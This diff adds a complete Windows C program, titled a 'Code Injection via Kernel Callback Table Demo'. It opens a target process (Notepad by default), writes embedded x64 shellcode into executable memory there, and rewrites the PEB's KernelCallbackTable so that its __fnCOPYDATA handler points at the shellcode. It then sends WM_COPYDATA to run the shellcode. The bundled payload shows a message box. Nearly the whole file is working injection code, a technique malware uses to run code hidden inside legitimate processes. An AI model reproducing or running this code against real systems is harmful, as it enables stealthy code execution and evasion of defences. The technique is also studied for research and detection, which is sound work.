@@ -1,0 +1,463 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <WinUser.h>
+#include <TlHelp32.h>
+#include <winternl.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define BREAK_WITH_ERROR(msg) { \
+    printf("[-] %s! Win32 Error: 0x%08lX\n", msg, GetLastError()); \
+    break; \
+}
+#define BREAK_WITH_STATUS(msg, s) { \
+    printf("[-] %s! NTSTATUS: 0x%08lX\n", msg, (ULONG)(s)); \
+    break; \
+}
+
+typedef LONG NTSTATUS;
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
+    IN  HANDLE ProcessHandle,
+    IN  ULONG  ProcessInformationClass,
+    OUT PVOID  ProcessInformation,
+    IN  ULONG  ProcessInformationLength,
+    OUT PULONG ReturnLength OPTIONAL
+    );
+
+typedef struct _MY_PEB {
+    BYTE    InheritedAddressSpace;
+    BYTE    ReadImageFileExecOptions;
+    BYTE    BeingDebugged;
+    BYTE    BitField;
+    ULONG   Padding0;
+    PVOID   Mutant;
+    PVOID   ImageBaseAddress;
+    PVOID   Ldr;
+    PVOID   ProcessParameters;
+    PVOID   SubSystemData;
+    PVOID   ProcessHeap;
+    PVOID   FastPebLock;
+    PVOID   AtlThunkSListPtr;
+    PVOID   IFEOKey;
+    ULONG   CrossProcessFlags;
+    ULONG   Padding1;
+    PVOID   KernelCallbackTable;
+} MY_PEB, * PMY_PEB;
+
+typedef struct _KERNELCALLBACKTABLE_T {
+    ULONG_PTR __fnCOPYDATA;
+    ULONG_PTR __fnCOPYGLOBALDATA;
+    ULONG_PTR __fnDWORD;
+    ULONG_PTR __fnNCDESTROY;
+    ULONG_PTR __fnDWORDOPTINLPMSG;
+    ULONG_PTR __fnINOUTDRAG;
+    ULONG_PTR __fnGETTEXTLENGTHS;
+    ULONG_PTR __fnINCNTOUTSTRING;
+    ULONG_PTR __fnPOUTLPINT;
+    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
+    ULONG_PTR __fnINLPCREATESTRUCT;
+    ULONG_PTR __fnINLPDELETEITEMSTRUCT;
+    ULONG_PTR __fnINLPDRAWITEMSTRUCT;
+    ULONG_PTR __fnPOPTINLPUINT;
+    ULONG_PTR __fnPOPTINLPUINT2;
+    ULONG_PTR __fnINLPMDICREATESTRUCT;
+    ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
+    ULONG_PTR __fnINLPWINDOWPOS;
+    ULONG_PTR __fnINOUTLPPOINT5;
+    ULONG_PTR __fnINOUTLPSCROLLINFO;
+    ULONG_PTR __fnINOUTLPRECT;
+    LONG_PTR  __fnINOUTNCCALCSIZE;
+    ULONG_PTR __fnINOUTLPPOINT5_;
+    ULONG_PTR __fnINPAINTCLIPBRD;
+    ULONG_PTR __fnINSIZECLIPBRD;
+    ULONG_PTR __fnINDESTROYCLIPBRD;
+    ULONG_PTR __fnINSTRING;
+    ULONG_PTR __fnINSTRINGNULL;
+    ULONG_PTR __fnINDEVICECHANGE;
+    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
+    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
+    ULONG_PTR __fnOUTDWORDINDWORD;
+    ULONG_PTR __fnOUTLPRECT;
+    ULONG_PTR __fnOUTSTRING;
+    ULONG_PTR __fnPOPTINLPUINT3;
+    ULONG_PTR __fnPOUTLPINT2;
+    ULONG_PTR __fnSENTDDEMSG;
+    ULONG_PTR __fnINOUTSTYLECHANGE;
+    ULONG_PTR __fnHkINDWORD;
+    ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
+    ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
+    ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
+    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
+    ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
+    ULONG_PTR __fnHkINLPRECT;
+    ULONG_PTR __fnHkOPTINLPEVENTMSG;
+    ULONG_PTR __xxxClientCallDelegateThread;
+    ULONG_PTR __ClientCallDummyCallback;
+    ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
+    ULONG_PTR __fnOUTLPCOMBOBOXINFO;
+    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
+    ULONG_PTR __xxxClientCallDevCallbackCapture;
+    ULONG_PTR __xxxClientCallDitThread;
+    ULONG_PTR __xxxClientEnableMMCSS;
+    ULONG_PTR __xxxClientUpdateDpi;
+    ULONG_PTR __xxxClientExpandStringW;
+    ULONG_PTR __ClientCopyDDEIn1;
+    ULONG_PTR __ClientCopyDDEIn2;
+    ULONG_PTR __ClientCopyDDEOut1;
+    ULONG_PTR __ClientCopyDDEOut2;
+    ULONG_PTR __ClientCopyImage;
+    ULONG_PTR __ClientEventCallback;
+    ULONG_PTR __ClientFindMnemChar;
+    ULONG_PTR __ClientFreeDDEHandle;
+    ULONG_PTR __ClientFreeLibrary;
+    ULONG_PTR __ClientGetCharsetInfo;
+    ULONG_PTR __ClientGetDDEFlags;
+    ULONG_PTR __ClientGetDDEHookData;
+    ULONG_PTR __ClientGetListboxString;
+    ULONG_PTR __ClientGetMessageMPH;
+    ULONG_PTR __ClientLoadImage;
+    ULONG_PTR __ClientLoadLibrary;
+    ULONG_PTR __ClientLoadMenu;
+    ULONG_PTR __ClientLoadLocalT1Fonts;
+    ULONG_PTR __ClientPSMTextOut;
+    ULONG_PTR __ClientLpkDrawTextEx;
+    ULONG_PTR __ClientExtTextOutW;
+    ULONG_PTR __ClientGetTextExtentPointW;
+    ULONG_PTR __ClientCharToWchar;
+    ULONG_PTR __ClientAddFontResourceW;
+    ULONG_PTR __ClientThreadSetup;
+    ULONG_PTR __ClientDeliverUserApc;
+    ULONG_PTR __ClientNoMemoryPopup;
+    ULONG_PTR __ClientMonitorEnumProc;
+    ULONG_PTR __ClientCallWinEventProc;
+    ULONG_PTR __ClientWaitMessageExMPH;
+    ULONG_PTR __ClientWOWGetProcModule;
+    ULONG_PTR __ClientWOWTask16SchedNotify;
+    ULONG_PTR __ClientImmLoadLayout;
+    ULONG_PTR __ClientImmProcessKey;
+    ULONG_PTR __fnIMECONTROL;
+    ULONG_PTR __fnINWPARAMDBCSCHAR;
+    ULONG_PTR __fnGETTEXTLENGTHS2;
+    ULONG_PTR __fnINLPKDRAWSWITCHWND;
+    ULONG_PTR __ClientLoadStringW;
+    ULONG_PTR __ClientLoadOLE;
+    ULONG_PTR __ClientRegisterDragDrop;
+    ULONG_PTR __ClientRevokeDragDrop;
+    ULONG_PTR __fnINOUTMENUGETOBJECT;
+    ULONG_PTR __ClientPrinterThunk;
+    ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
+    ULONG_PTR __fnOUTLPSCROLLBARINFO;
+    ULONG_PTR __fnINLPUAHDRAWMENU2;
+    ULONG_PTR __fnINLPUAHDRAWMENUITEM;
+    ULONG_PTR __fnINLPUAHDRAWMENU3;
+    ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
+    ULONG_PTR __fnINLPUAHDRAWMENU4;
+    ULONG_PTR __fnOUTLPTITLEBARINFOEX;
+    ULONG_PTR __fnTOUCH;
+    ULONG_PTR __fnGESTURE;
+    ULONG_PTR __fnPOPTINLPUINT4;
+    ULONG_PTR __fnPOPTINLPUINT5;
+    ULONG_PTR __xxxClientCallDefaultInputHandler;
+    ULONG_PTR __fnEMPTY;
+    ULONG_PTR __ClientRimDevCallback;
+    ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
+    ULONG_PTR __ClientCallLocalMouseHooks;
+    ULONG_PTR __xxxClientBroadcastThemeChange;
+    ULONG_PTR __xxxClientCallDevCallbackSimple;
+    ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
+    ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
+    ULONG_PTR __fnGETWINDOWDATA;
+    ULONG_PTR __fnINOUTSTYLECHANGE2;
+    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
+} KERNELCALLBACKTABLE, * PKERNELCALLBACKTABLE;
+
+BYTE shellcode[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
+"\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x48"
+"\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
+"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
+"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
+"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
+"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
+"\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
+"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
+"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
+"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
+"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
+"\x58\x41\x58\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41"
+"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
+"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
+"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x18"
+"\x00\x00\x00\x48\x65\x20\x68\x65\x20\x68\x65\x68\x65\x2c"
+"\x20\x69\x6d\x20\x48\x75\x79\x20\x54\x72\x61\x6e\x00\x5a"
+"\xe8\x07\x00\x00\x00\x6e\x6f\x20\x63\x61\x70\x00\x41\x58"
+"\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d"
+"\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28"
+"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
+"\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+BOOL KernelCallbackTableInject(HWND hTargetWindow, DWORD targetPid);
+
+DWORD GetProcessIdByName(const wchar_t* processName) {
+    DWORD pid = 0;
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateToolhelp32Snapshot failed: 0x%lX\n", GetLastError());
+        return 0;
+    }
+
+    PROCESSENTRY32W pe32 = { 0 };
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
+                pid = pe32.th32ProcessID;
+                printf("[+] Found '%ls' with PID: %lu\n", processName, pid);
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+typedef struct _ENUM_PARAM {
+    DWORD dwProcessId;
+    HWND  hWindow;
+} ENUM_PARAM, * PENUM_PARAM;
+
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    PENUM_PARAM pParam = (PENUM_PARAM)lParam;
+    DWORD processId = 0;
+
+    GetWindowThreadProcessId(hwnd, &processId);
+
+    if (processId == pParam->dwProcessId && IsWindowVisible(hwnd)) {
+        wchar_t title[256] = { 0 };
+        GetWindowTextW(hwnd, title, 256);
+        if (wcslen(title) > 0) {
+            pParam->hWindow = hwnd;
+            printf("[+] Found target window: 0x%p (Title: %ls)\n", hwnd, title);
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+
+BOOL KernelCallbackTableInject(HWND hTargetWindow, DWORD targetPid) {
+    BOOL returnStatus = FALSE;
+    NTSTATUS status = 0;
+
+    HMODULE hNtdll = NULL;
+    pfnNtQueryInformationProcess pNtQueryInformationProcess = NULL;
+    HANDLE hTargetProcess = NULL;
+
+    LPBYTE pRemoteShellcode = NULL;
+    LPBYTE pFakeKct = NULL;
+
+    WCHAR triggerMessage[] = L"TRIGGER_PAYLOAD";
+
+    do {
+        hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (!hNtdll) BREAK_WITH_ERROR("Failed to get ntdll.dll handle");
+
+        pNtQueryInformationProcess = (pfnNtQueryInformationProcess)
+            GetProcAddress(hNtdll, "NtQueryInformationProcess");
+        if (!pNtQueryInformationProcess)
+            BREAK_WITH_ERROR("Failed to get NtQueryInformationProcess");
+
+        printf("[+] Got NtQueryInformationProcess at: 0x%p\n", pNtQueryInformationProcess);
+
+        hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+        if (!hTargetProcess) BREAK_WITH_ERROR("Failed to open target process (try run as Admin!)");
+
+        printf("[+] Opened target process (PID: %lu, Handle: 0x%p)\n",
+            targetPid, hTargetProcess);
+
+        PROCESS_BASIC_INFORMATION pbi = { 0 };
+        status = pNtQueryInformationProcess(
+            hTargetProcess,
+            0,
+            &pbi,
+            sizeof(pbi),
+            NULL
+        );
+        if (!NT_SUCCESS(status)) BREAK_WITH_STATUS("NtQueryInformationProcess failed", status);
+
+        printf("[+] PEB base address (in target): 0x%p\n", pbi.PebBaseAddress);
+
+        MY_PEB peb = { 0 };
+        if (!ReadProcessMemory(hTargetProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
+            BREAK_WITH_ERROR("Failed to read target PEB");
+
+        printf("[+] KernelCallbackTable pointer (original): 0x%p\n", peb.KernelCallbackTable);
+
+        KERNELCALLBACKTABLE kct = { 0 };
+        if (!ReadProcessMemory(hTargetProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL))
+            BREAK_WITH_ERROR("Failed to read KernelCallbackTable");
+
+        printf("[+] Original __fnCOPYDATA handler: 0x%p\n", (PVOID)kct.__fnCOPYDATA);
+
+        pRemoteShellcode = (LPBYTE)VirtualAllocEx(
+            hTargetProcess,
+            NULL,
+            sizeof(shellcode),
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_EXECUTE_READWRITE
+        );
+        if (!pRemoteShellcode) BREAK_WITH_ERROR("VirtualAllocEx shellcode failed");
+
+        if (!WriteProcessMemory(hTargetProcess, pRemoteShellcode, shellcode, sizeof(shellcode), NULL))
+            BREAK_WITH_ERROR("WriteProcessMemory shellcode failed");
+
+        printf("[+] Shellcode injected at: 0x%p (size: %zu bytes)\n",
+            pRemoteShellcode, sizeof(shellcode));
+
+        kct.__fnCOPYDATA = (ULONG_PTR)pRemoteShellcode;
+        printf("[+] Replaced __fnCOPYDATA with shellcode address: 0x%p\n", pRemoteShellcode);
+
+        pFakeKct = (LPBYTE)VirtualAllocEx(
+            hTargetProcess,
+            NULL,
+            sizeof(kct),
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_READWRITE
+        );
+        if (!pFakeKct) BREAK_WITH_ERROR("VirtualAllocEx fake KCT failed");
+
+        if (!WriteProcessMemory(hTargetProcess, pFakeKct, &kct, sizeof(kct), NULL))
+            BREAK_WITH_ERROR("WriteProcessMemory fake KCT failed");
+
+        printf("[+] Fake KCT written at: 0x%p\n", pFakeKct);
+
+        PVOID pPebKctField = (PVOID)(
+            (PBYTE)pbi.PebBaseAddress + offsetof(MY_PEB, KernelCallbackTable)
+            );
+
+        if (!WriteProcessMemory(hTargetProcess, pPebKctField, &pFakeKct, sizeof(PVOID), NULL))
+            BREAK_WITH_ERROR("Failed to update PEB -> KernelCallbackTable");
+
+        printf("[+] PEB.KernelCallbackTable updated to: 0x%p\n", pFakeKct);
+
+        printf("[*] Sending WM_COPYDATA to trigger shellcode...\n");
+
+        COPYDATASTRUCT cds = { 0 };
+        cds.dwData = 0x1337;
+        cds.cbData = (lstrlenW(triggerMessage) + 1) * sizeof(WCHAR);
+        cds.lpData = triggerMessage;
+
+        DWORD_PTR sendResult = 0;
+        LRESULT sendRet = SendMessageTimeoutW(
+            hTargetWindow,
+            WM_COPYDATA,
+            (WPARAM)hTargetWindow,
+            (LPARAM)&cds,
+            SMTO_ABORTIFHUNG,
+            5000,
+            &sendResult
+        );
+
+        printf("[+] WM_COPYDATA sent! Return: %lld | Result: %llu\n", sendRet, sendResult);
+        printf("[*] If MessageBox appeared in Notepad, injection succeeded!\n");
+
+        Sleep(500);
+
+        if (!WriteProcessMemory(hTargetProcess, pPebKctField,
+            &peb.KernelCallbackTable, sizeof(PVOID), NULL))
+            BREAK_WITH_ERROR("Failed to restore original KCT");
+
+        printf("[+] Original KCT restored successfully.\n");
+        returnStatus = TRUE;
+
+    } while (0);
+
+    if (pRemoteShellcode) VirtualFreeEx(hTargetProcess, pRemoteShellcode, 0, MEM_RELEASE);
+    if (pFakeKct)         VirtualFreeEx(hTargetProcess, pFakeKct, 0, MEM_RELEASE);
+    if (hTargetProcess)   CloseHandle(hTargetProcess);
+
+    return returnStatus;
+}
+
+int main(int argc, const char* argv[]) {
+    printf("====================================================\n");
+    printf("  Code Injection via Kernel Callback Table Demo\n");
+    printf("  Target: notepad.exe (or specify PID)\n");
+    printf("  Payload: MessageBox shellcode\n");
+    printf("====================================================\n\n");
+
+    size_t kctOffset = offsetof(MY_PEB, KernelCallbackTable);
+    printf("[*] Verifying MY_PEB struct layout...\n");
+    printf("[*] KernelCallbackTable offset = 0x%zX (expected 0x58)\n", kctOffset);
+
+    if (kctOffset != 0x58) {
+        printf("[-] FATAL: Struct layout is WRONG! Cannot proceed.\n");
+        printf("[-] This means the compiler added unexpected padding.\n");
+        printf("[-] Expected: 0x58, Got: 0x%zX\n", kctOffset);
+        return 1;
+    }
+    printf("[+] Struct layout OK!\n\n");
+
+    DWORD targetPid = 0;
+
+    if (argc >= 2) {
+        targetPid = (DWORD)atoi(argv[1]);
+        if (targetPid == 0) {
+            printf("[-] Invalid PID: %s\n", argv[1]);
+            printf("[*] Usage: %s [PID]\n", argv[0]);
+            return 1;
+        }
+        printf("[*] Using provided PID: %lu\n", targetPid);
+    }
+    else {
+        printf("[*] Searching for notepad.exe...\n");
+        targetPid = GetProcessIdByName(L"notepad.exe");
+
+        if (targetPid == 0) {
+            printf("[-] notepad.exe not found!\n");
+            printf("[*] Please open Notepad first, then run this program.\n");
+            printf("[*] Or specify a PID: %s <PID>\n", argv[0]);
+            return 1;
+        }
+    }
+
+    printf("\n");
+
+    printf("[*] Searching for target window...\n");
+    ENUM_PARAM param = { targetPid, NULL };
+    EnumWindows(EnumWindowsProc, (LPARAM)&param);
+
+    if (!param.hWindow) {
+        printf("[-] No visible window found for PID %lu!\n", targetPid);
+        printf("[*] The target process must have a visible window with a title.\n");
+        printf("[*] Make sure Notepad is open and visible (not minimized).\n");
+        return 1;
+    }
+
+    printf("\n");
+
+    printf("[*] Starting KernelCallbackTable injection...\n\n");
+    if (KernelCallbackTableInject(param.hWindow, targetPid)) {
+        printf("\n[+] ==========================================\n");
+        printf("[+]  INJECTION SUCCESSFUL!\n");
+        printf("[+]  A MessageBox should have appeared in Notepad.\n");
+        printf("[+] ==========================================\n");
+    }
+    else {
+        printf("\n[-] ==========================================\n");
+        printf("[-]  INJECTION FAILED!\n");
+        printf("[-]  Check if you ran as Administrator.\n");
+        printf("[-] ==========================================\n");
+    }
+
+    printf("\nPress Enter to exit...");
+    getchar();
+    return 0;
+}
